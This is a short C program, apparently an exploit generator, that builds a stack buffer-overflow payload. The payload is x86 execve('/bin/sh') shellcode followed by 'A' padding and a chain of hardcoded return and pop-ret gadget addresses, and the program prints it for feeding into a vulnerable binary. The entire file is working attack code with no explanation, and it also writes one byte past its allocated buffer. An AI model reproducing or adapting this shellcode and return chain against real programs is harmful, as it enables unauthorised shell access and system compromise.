#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define POPRET 0x08048467
#define RET 0x08048468
#define bufsize 264
#define chainsize 4
#define shellcode "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80"

int main(void) {
	char *buff, *ptr;
	long *adrptr;
	int i;
	buff = malloc(bufsize);
	for (i = 0; i < bufsize; i++)
		buff[i] = 'A';
	ptr = buff + bufsize - chainsize;
	adrptr = (long *) ptr;
	for (i = bufsize - chainsize; i < bufsize; i += 4)
		if (i == bufsize - 4) * (adrptr++) = POPRET;
		else *(adrptr++) = RET;
	ptr = buff;
	for (i = 0; i < strlen(shellcode); i++)
		*(ptr++) = shellcode[i];
	buff[bufsize] = '\0';
	printf("%s", buff);
}